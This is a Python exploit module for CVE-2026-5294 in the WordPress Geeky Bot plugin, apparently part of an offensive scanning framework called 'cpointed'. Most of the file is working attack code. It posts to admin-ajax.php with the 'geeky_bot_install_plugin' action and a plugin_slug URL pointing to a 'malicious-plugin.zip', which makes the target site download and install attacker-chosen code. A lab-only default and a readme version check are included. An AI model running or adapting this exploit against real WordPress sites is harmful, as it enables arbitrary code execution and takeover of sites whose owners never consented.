# Made by Sn0w8ird

from __future__ import annotations

import os
from typing import Any, Dict

from cpointed.core.engine import ScanResult, Target
from cpointed.core.session import CPointedClient
from cpointed.modules.wordpress.base import WordPressModule


class CVE20265294GeekyBot(WordPressModule):
    name = "CVE-2026-5294"
    severity = 8.5
    affected_versions = ["Geeky Bot: CVSS pending vendor confirmation"]
    cwe = "CWE-434 / plugin install primitive (research)"
    plugin_readme_paths = (
        "/wp-content/plugins/geeky-bot/readme.txt",
        "/wp-content/plugins/geekybot/readme.txt",
    )
    slug_hint = "geeky"

    async def exploit_remote_primitive(
        self,
        client: CPointedClient,
        wp_path: str,
        *,
        target: Target,
        timeout: float,
    ) -> Dict[str, Any]:
        """
        ``geeky_bot_install_plugin`` + ``plugin_slug`` URL to ZIP (use ``CPOINTED_GEEKYBOT_INSTALL_URL`` in lab).
        """
        ajax = self._path_for_wp(wp_path, "/wp-admin/admin-ajax.php")
        install_payload = {
            "action": "geeky_bot_install_plugin",
            "plugin_slug": os.environ.get(
                "CPOINTED_GEEKYBOT_INSTALL_URL",
                "https://127.0.0.1:9/malicious-plugin.zip",
            ),
        }
        try:
            resp = await client.post(ajax, data=install_payload, timeout=timeout)
            ok = resp.status_code == 200
            return {
                "install_triggered": ok,
                "install_status_code": resp.status_code,
                "response_truncated": (resp.text or "")[:100],
                "success": ok,
            }
        except Exception as exc:  # pragma: no cover - network
            return {
                "install_triggered": False,
                "response_truncated": str(exc)[:100],
                "success": False,
            }

    async def check(self, target: Target, *, timeout: float = 30.0) -> ScanResult:
        return await self.check_from_readme(target, timeout=timeout)
